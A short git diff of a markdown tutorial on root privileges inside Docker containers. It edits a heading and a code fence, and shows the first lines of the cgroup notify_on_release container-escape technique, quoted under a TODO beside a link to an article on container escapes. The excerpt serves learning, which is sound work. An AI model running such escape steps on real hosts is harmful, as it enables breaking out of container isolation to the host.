@@ -1,4 +1,4 @@
-# 05 - Root user
+# ROOT USER
 
 Demonstrate root user and privilege inside the container.  
 
@@ -169,7 +169,8 @@ This will only work on Linux.  It doesn't work on Docker for Desktop.
 
 **TODO** Can I use this to get access to another container filesystem without being in same namespace?  
 [understanding-docker-container-escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)  
-```
+
+```sh
 d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
 mkdir -p $d/w;echo 1 >$d/w/notify_on_release
 t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
